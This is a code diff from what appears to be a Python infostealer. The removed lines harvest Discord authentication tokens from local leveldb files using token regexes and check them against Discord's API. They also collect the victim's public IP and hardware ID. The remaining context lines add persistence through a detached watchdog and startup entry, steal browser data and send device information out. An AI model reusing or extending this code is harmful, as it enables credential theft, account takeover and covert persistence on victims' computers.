@@ -297,78 +297,6 @@ def ensure_watchdog():
         pythonw_path = sys.executable.replace("python.exe", "pythonw.exe")
         subprocess.Popen([pythonw_path, watchdog_script], creationflags=subprocess.DETACHED_PROCESS)
 
-
-
-
-
-
-# gaming
-def getHeader(token=None, content_type="application/json"):
-    headers = {
-        "Content-Type": content_type,
-        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.157 Safari/537.36"
-    }
-    if token:
-        headers.update({"Authorization": token})
-    return headers
-
-def getUserData(token):
-    try:
-        response = urlopen(Request("https://discordapp.com/api/v6/users/@me", headers=getHeader(token)))
-        if response.getcode() == 200:
-            return loads(response.read().decode())
-        else:
-            debug(f"Invalid token: {token}")
-            return None
-    except Exception as e:
-        debug(f"Error getting user data: {e}")
-        return None
-
-def getTokenz(path):
-    path += "\\Local Storage\\leveldb"
-    tokens = []
-    try:
-        for file_name in os.listdir(path):
-            if not file_name.endswith(".log") and not file_name.endswith(".ldb"):
-                continue
-            for line in [x.strip() for x in open(f"{path}\\{file_name}", errors="ignore").readlines() if x.strip()]:
-                for regex in (r"[\w-]{24}\.[\w-]{6}\.[\w-]{27}", r"mfa\.[\w-]{84}") :
-                    for token in findall(regex, line):
-                        tokens.append(token)
-    except Exception as e:
-        debug(f"Error getting tokens: {e}")
-    return tokens
-
-def whoTheFuckAmI():
-    try:
-        ip = urlopen(Request("https://ifconfig.me")).read().decode().strip()
-        debug(f"IP address: {ip}")
-        return ip
-    except Exception as e:
-        debug(f"Error getting IP: {e}")
-        return "None"
-
-def hWiD():
-    try:
-        p = Popen("wmic csproduct get uuid", shell=True, stdin=PIPE, stdout=PIPE, stderr=PIPE)
-        hwid = (p.stdout.read() + p.stderr.read()).decode().split("\n")[1]
-        debug(f"HWID: {hwid}")
-        return hwid
-    except Exception as e:
-        debug(f"Error getting HWID: {e}")
-        return "None"
-
-def try_extract(func):
-        def wrapper(*args, **kwargs):
-            try:
-                func(*args, **kwargs)
-            except Exception:
-                pass
-        return wrapper
-
-
-
-
 try:
     if not IsAdmin():
         if GetSelf()[1]:
@@ -421,7 +349,7 @@ if cc.get_browser_stealing():
 
 #enable_privileges()
 #take_ownership(HIDDEN_DIR)
-move_to_hidden_directory()
+#move_to_hidden_directory()
 ensure_watchdog()
 add_to_startup()
 send_device_information()
